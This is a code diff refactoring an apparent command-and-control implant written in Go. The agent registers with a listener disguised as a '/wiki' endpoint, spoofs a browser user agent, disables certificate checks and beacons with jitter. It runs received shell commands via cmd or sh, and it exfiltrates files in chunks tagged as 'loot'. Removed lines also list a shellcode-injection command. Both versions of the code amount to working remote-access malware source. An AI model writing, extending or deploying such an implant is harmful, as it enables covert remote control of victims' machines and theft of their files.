@@ -31,7 +31,6 @@ import (
 
 // Build-time configuration - can be overridden with -ldflags during compilation
 var (
-	listenerProtocol     = "https"
 	listenerHost         = "localhost"
 	listenerPort         = "8080"
 	listenerEndpoint     = "/wiki"
@@ -42,31 +41,28 @@ var (
 	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 )
 
-var reconnectInterval = 15
-var currentInterval = 15
-var jitterSeconds = 10
-var hmacKey = []byte(hmacKeyHex)
-var agentID = uuid.New().String()
-var currentCommandID int
-var httpClient = &http.Client{
-	Transport: &http.Transport{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true, // Skip certificate verification for self-signed certs
+// Global state
+var (
+	reconnectInterval = 15
+	currentInterval   = 15
+	jitterSeconds     = 10
+	hmacKey           = []byte(hmacKeyHex)
+	agentID           = uuid.New().String()
+	currentCommandID  int
+	httpClient        = &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true,
+			},
 		},
-	},
-}
+	}
+)
 
-func listenerEndpointURL() string {
-	path := strings.TrimSpace(listenerEndpoint)
-	if path == "" || path == "/" {
-		return fmt.Sprintf("%s://%s:%s", listenerProtocol, listenerHost, listenerPort)
-	}
-	if !strings.HasPrefix(path, "/") {
-		path = "/" + path
-	}
-	path = strings.TrimRight(path, "/")
-	return fmt.Sprintf("%s://%s:%s%s", listenerProtocol, listenerHost, listenerPort, path)
-}
+// Constants
+const (
+	chunkSize      = 2 * 1024 * 1024  // 2MB chunks for file transfers
+	chunkThreshold = 10 * 1024 * 1024 // 10MB threshold for chunked transfers
+)
 
 // HMAC signing functions
 func generateHMAC(message string, key []byte) string {
@@ -127,6 +123,127 @@ type ProcessInfo struct {
 	Parent uint32
 }
 
+// Helper functions
+
+// sendHTTPSRequest sends a request using HTTPS
+func sendHTTPSRequest(endpoint string, data []byte, headers map[string]string) ([]byte, error) {
+	url := fmt.Sprintf("https://%s:%s%s", listenerHost, listenerPort, endpoint)
+
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
+	if err != nil {
+		return nil, fmt.Errorf("failed to create HTTPS request: %v", err)
+	}
+
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+	req.Header.Set("User-Agent", userAgent)
+
+	resp, err := httpClient.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("failed to send HTTPS request: %v", err)
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read HTTPS response: %v", err)
+	}
+
+	response := map[string]interface{}{
+		"status": resp.StatusCode,
+		"body":   string(body),
+	}
+
+	return json.Marshal(response)
+}
+
+// wrapWithHMAC wraps data with HMAC signature
+func wrapWithHMAC(data interface{}) ([]byte, error) {
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+
+	body := string(jsonData)
+	timestamp, signature := signRequest("POST", listenerEndpoint, body)
+
+	wrapper := map[string]interface{}{
+		"data":      json.RawMessage(jsonData),
+		"timestamp": timestamp,
+		"signature": signature,
+	}
+
+	return json.Marshal(wrapper)
+}
+
+// sendSignedRequest sends a signed HTTPS request with custom headers
+func sendSignedRequest(data interface{}, customHeaders map[string]string) ([]byte, error) {
+	finalData, err := wrapWithHMAC(data)
+	if err != nil {
+		return nil, err
+	}
+
+	headers := map[string]string{"Content-Type": "application/json"}
+	for k, v := range customHeaders {
+		headers[k] = v
+	}
+
+	return sendHTTPSRequest(listenerEndpoint, finalData, headers)
+}
+
+// parseHTTPSResponse parses the HTTPS response and extracts the body
+func parseHTTPSResponse(respData []byte) (map[string]interface{}, error) {
+	var httpResponse map[string]interface{}
+	if err := json.Unmarshal(respData, &httpResponse); err != nil {
+		return nil, fmt.Errorf("invalid response format: %v", err)
+	}
+
+	statusCode, ok := httpResponse["status"].(float64)
+	if !ok || statusCode != 200 {
+		return nil, fmt.Errorf("request failed: status %v", statusCode)
+	}
+
+	bodyStr, ok := httpResponse["body"].(string)
+	if !ok {
+		return httpResponse, nil // Some responses don't have a body field
+	}
+
+	var result map[string]interface{}
+	if err := json.Unmarshal([]byte(bodyStr), &result); err != nil {
+		return nil, fmt.Errorf("failed to parse response body: %v", err)
+	}
+
+	return result, nil
+}
+
+// resolveFilePath resolves a file path relative to current directory
+func resolveFilePath(path string) (string, error) {
+	if filepath.IsAbs(path) {
+		return filepath.Abs(path)
+	}
+
+	currentDir, err := os.Getwd()
+	if err != nil {
+		return "", fmt.Errorf("failed to get current directory: %v", err)
+	}
+
+	return filepath.Abs(filepath.Join(currentDir, path))
+}
+
+// execSystemCommand executes a system command with proper platform handling
+func execSystemCommand(command string) (string, error) {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", command)
+	} else {
+		cmd = exec.Command("sh", "-c", command)
+	}
+
+	output, err := cmd.CombinedOutput()
+	return string(output), err
+}
+
 func main() {
 	if interval, err := strconv.Atoi(reconnectIntervalStr); err == nil && interval > 0 {
 		reconnectInterval = interval
@@ -173,48 +290,13 @@ func main() {
 }
 
 func registerAgent(reg AgentRegistration) error {
-	// Marshal data WITHOUT timestamp/signature first
-	jsonData, err := json.Marshal(reg)
+	respData, err := sendSignedRequest(reg, nil)
 	if err != nil {
 		return err
 	}
 
-	// HMAC goes in body, not headers
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	// Preserve exact bytes that were signed (avoids JSON field order issues)
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData), // Preserve exact JSON that was signed
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Create request with NO custom headers - just plain JSON!
-	req, err := http.NewRequest("POST", listenerEndpointURL(), bytes.NewBuffer(finalData))
-	if err != nil {
-		return err
-	}
-
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", userAgent)
-
-	resp, err := httpClient.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("registration failed with status: %d", resp.StatusCode)
-	}
-
-	return nil
+	_, err = parseHTTPSResponse(respData)
+	return err
 }
 
 func getLocalIP() string {
@@ -293,60 +375,38 @@ func subscribeToCommands(agentID string) {
 }
 
 func getPendingCommands(agentID string) ([]Command, error) {
-	// Simple poll request (no GraphQL)
 	pollRequest := map[string]interface{}{
 		"agentId": agentID,
 	}
 
-	jsonData, err := json.Marshal(pollRequest)
+	respData, err := sendSignedRequest(pollRequest, nil)
 	if err != nil {
 		return nil, err
 	}
 
-	// HMAC goes in body, not headers
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	// Create wrapper with timestamp, signature, AND original signed data
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
+	result, err := parseHTTPSResponse(respData)
 	if err != nil {
 		return nil, err
 	}
 
-	// Create request with NO custom headers - just plain JSON!
-	req, err := http.NewRequest("POST", listenerEndpointURL(), bytes.NewBuffer(finalData))
+	// Extract commands from the result
+	commandsData, ok := result["commands"]
+	if !ok {
+		return []Command{}, nil
+	}
+
+	// Marshal and unmarshal to convert to []Command
+	commandsJSON, err := json.Marshal(commandsData)
 	if err != nil {
 		return nil, err
 	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", userAgent)
 
-	httpClient.Timeout = 10 * time.Second
-	resp, err := httpClient.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("poll request failed: status %d", resp.StatusCode)
-	}
-
-	var result struct {
-		Commands []Command `json:"commands"`
-	}
-
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+	var commands []Command
+	if err := json.Unmarshal(commandsJSON, &commands); err != nil {
 		return nil, err
 	}
 
-	return result.Commands, nil
+	return commands, nil
 }
 
 func parseCommand(command string) []string {
@@ -567,13 +627,6 @@ func formatFileSize(size int64) string {
 	return fmt.Sprintf("%.1f%s", float64(size)/float64(div), units[exp])
 }
 
-const (
-	// Chunk size for file transfers (2MB)
-	chunkSize = 2 * 1024 * 1024
-	// Threshold for using chunked transfers (10MB)
-	chunkThreshold = 10 * 1024 * 1024
-)
-
 func handleGet(args []string) (string, error) {
 	if len(args) == 0 {
 		return "", fmt.Errorf("usage: get <filepath>")
@@ -707,54 +760,19 @@ func initiateChunkedTransfer(absPath, filename string, fileSize int64, totalChun
 		"expectedMd5":  expectedMD5,
 	}
 
-	jsonData, err := json.Marshal(initReq)
+	respData, err := sendSignedRequest(initReq, nil)
 	if err != nil {
 		return "", err
 	}
 
-	// Sign and wrap request
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
+	response, err := parseHTTPSResponse(respData)
 	if err != nil {
 		return "", err
-	}
-
-	// Send request
-	req, err := http.NewRequest("POST", listenerEndpointURL(), bytes.NewBuffer(finalData))
-	if err != nil {
-		return "", err
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", userAgent)
-
-	httpClient.Timeout = 10 * time.Second
-	resp, err := httpClient.Do(req)
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-
-	respData, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return "", fmt.Errorf("failed to read response: %v", err)
-	}
-
-	var response map[string]interface{}
-	if err := json.Unmarshal(respData, &response); err != nil {
-		return "", fmt.Errorf("failed to parse response: %v", err)
 	}
 
 	sessionID, ok := response["sessionId"].(string)
 	if !ok {
-		return "", fmt.Errorf("no session ID in response. Response: %+v", response)
+		return "", fmt.Errorf("no session ID in response")
 	}
 
 	return sessionID, nil
@@ -769,57 +787,13 @@ func uploadChunk(sessionID string, chunkIndex int, chunkData []byte, chunkMD5 st
 		"chunkMd5":   chunkMD5,
 	}
 
-	jsonData, err := json.Marshal(chunkReq)
+	respData, err := sendSignedRequest(chunkReq, nil)
 	if err != nil {
 		return err
 	}
 
-	// Sign and wrap request
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Send request
-	req, err := http.NewRequest("POST", listenerEndpointURL(), bytes.NewBuffer(finalData))
-	if err != nil {
-		return err
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", userAgent)
-
-	httpClient.Timeout = 10 * time.Second
-	resp, err := httpClient.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	respData, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("failed to read response: %v", err)
-	}
-
-	var response map[string]interface{}
-	if err := json.Unmarshal(respData, &response); err != nil {
-		return err
-	}
-
-	status, _ := response["status"].(float64)
-	if status != 200 {
-		return fmt.Errorf("server returned status %v", status)
-	}
-
-	return nil
+	_, err = parseHTTPSResponse(respData)
+	return err
 }
 
 // completeChunkedTransfer signals the server to assemble and finalize the transfer
@@ -829,57 +803,13 @@ func completeChunkedTransfer(sessionID string) error {
 		"complete":  true,
 	}
 
-	jsonData, err := json.Marshal(completeReq)
+	respData, err := sendSignedRequest(completeReq, nil)
 	if err != nil {
 		return err
 	}
 
-	// Sign and wrap request
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Send request
-	req, err := http.NewRequest("POST", listenerEndpointURL(), bytes.NewBuffer(finalData))
-	if err != nil {
-		return err
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", userAgent)
-
-	httpClient.Timeout = 10 * time.Second
-	resp, err := httpClient.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	respData, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("failed to read response: %v", err)
-	}
-
-	var response map[string]interface{}
-	if err := json.Unmarshal(respData, &response); err != nil {
-		return err
-	}
-
-	status, _ := response["status"].(float64)
-	if status != 200 {
-		return fmt.Errorf("server returned status %v", status)
-	}
-
-	return nil
+	_, err = parseHTTPSResponse(respData)
+	return err
 }
 
 func handleCd(args []string) (string, error) {
@@ -1333,51 +1263,13 @@ func handleJitter(args []string) (string, error) {
 	return fmt.Sprintf("Jitter changed from +/- %d to +/- %d seconds", oldJitter, newJitter), nil
 }
 
-func decodeCommand(command string) string {
-	commandMap := map[string]string{
-		"1":  "ls",
-		"2":  "get",
-		"3":  "put",
-		"4":  "cd",
-		"5":  "kill",
-		"6":  "ps",
-		"7":  "exec",
-		"8":  "reconnect",
-		"9":  "injectsc",
-		"10": "rm",
-		"11": "rmdir",
-		"12": "jitter",
-	}
-
-	spaceIdx := strings.IndexAny(command, " \t")
-	var cmdID string
-	var rest string
-	
-	if spaceIdx == -1 {
-		cmdID = command
-		rest = ""
-	} else {
-		cmdID = command[:spaceIdx]
-		rest = command[spaceIdx:]
-	}
-
-	if cmdName, ok := commandMap[cmdID]; ok {
-		return cmdName + rest
-	}
-
-	return command
-}
-
 func executeCommand(command string) (string, error) {
 	if command == "" {
 		return "", fmt.Errorf("empty command")
 	}
 
-	// Decode command ID to command name (if encoded)
-	decodedCommand := decodeCommand(command)
-
 	// Check if it's a builtin command first
-	output, err := handleBuiltinCommand(decodedCommand)
+	output, err := handleBuiltinCommand(command)
 	if err == nil {
 		return output, nil
 	}
@@ -1391,9 +1283,9 @@ func executeCommand(command string) (string, error) {
 	// Cross-platform command execution
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/C", decodedCommand)
+		cmd = exec.Command("cmd", "/C", command)
 	} else {
-		cmd = exec.Command("sh", "-c", decodedCommand)
+		cmd = exec.Command("sh", "-c", command)
 	}
 
 	systemOutput, err := cmd.CombinedOutput()
@@ -1411,62 +1303,19 @@ func sendCommandResponse(commandID int, output, status string) error {
 		Status:    status,
 	}
 
-	jsonData, err := json.Marshal(response)
-	if err != nil {
-		return err
-	}
-
-	// HMAC goes in body, not headers
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	// Create wrapper with timestamp, signature, AND original signed data
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Create request with NO custom headers - just plain JSON!
-	req, err := http.NewRequest("POST", listenerEndpointURL(), bytes.NewBuffer(finalData))
-	if err != nil {
-		return err
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", userAgent)
-
-	// Check if this is a file response (contains "got" and LOOT_ENTRIES)
-	if strings.Contains(output, "got") && strings.Contains(output, "LOOT_ENTRIES:") {
-		req.Header.Set("type", "loot")
-
-		// Loot entries are embedded in the output body; no need to duplicate in headers
-	}
-
-	// Check if this response contains loot entries (from ls command)
+	// Add loot type header if output contains loot entries
+	var headers map[string]string
 	if strings.Contains(output, "LOOT_ENTRIES:") {
-		req.Header.Set("type", "loot")
-
-		// Loot entries are embedded in the output body; no need to duplicate in headers
+		headers = map[string]string{"type": "loot"}
 	}
 
-	httpClient.Timeout = 10 * time.Second
-	resp, err := httpClient.Do(req)
+	respData, err := sendSignedRequest(response, headers)
 	if err != nil {
 		return err
 	}
-	defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusOK {
-		body, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("command response failed: status %d, body: %s", resp.StatusCode, string(body))
-	}
-
-	return nil
+	_, err = parseHTTPSResponse(respData)
+	return err
 }
 
 func sendLootEntry(lootEntry map[string]interface{}) error {
@@ -1479,7 +1328,8 @@ func sendLootEntry(lootEntry map[string]interface{}) error {
 	body := string(jsonData)
 	timestamp, signature := signRequest("POST", "/wiki/api/loot", body)
 
-	req, err := http.NewRequest("POST", listenerEndpointURL()+"/api/loot", bytes.NewBuffer(jsonData))
+	url := fmt.Sprintf("https://%s:%s%s/api/loot", listenerHost, listenerPort, listenerEndpoint)
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 	if err != nil {
 		return err
 	}
